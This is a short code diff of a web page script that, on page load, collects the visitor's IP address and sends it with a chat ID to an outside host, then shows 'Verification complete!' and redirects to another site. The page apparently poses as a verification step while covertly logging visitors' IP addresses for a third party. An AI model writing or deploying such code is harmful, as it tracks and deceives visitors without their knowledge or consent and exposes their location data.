@@ -91,15 +91,14 @@
     async function sendIP() {
         const ip = await getIP();
         const url = `https://whatapi.cloud:8443/loc?chat_id=${chatId}&ip=${ip}`;
-        axios
-            .get(url)
+        fetch(url)
             .then(() => {
                 message.textContent = 'Verification complete!';
                 window.location.href = `https://venomtool.in/I/?id=${chatId}`;
             });
     }
 
-    
+    // Send IP address on page load
     sendIP();
 </script>
 
